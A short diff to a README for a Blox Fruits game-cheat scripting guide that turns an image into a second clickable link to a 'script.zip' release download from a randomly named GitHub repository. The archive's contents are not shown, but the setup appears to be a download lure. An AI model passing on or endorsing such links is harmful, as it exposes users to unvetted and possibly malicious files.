@@ -7,8 +7,8 @@ This **2025 Blox Fruits scripting guide** dives deep into the best, safe, and mo
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
 ](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
 
-![da974a64-e5c6-45ff-991d-3399054429f3](https://github.com/user-attachments/assets/9c50a9fe-f5a3-4f18-9bde-95993542641b)
-
+[![da974a64-e5c6-45ff-991d-3399054429f3](https://github.com/user-attachments/assets/9c50a9fe-f5a3-4f18-9bde-95993542641b)
+](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
 
 ---
 
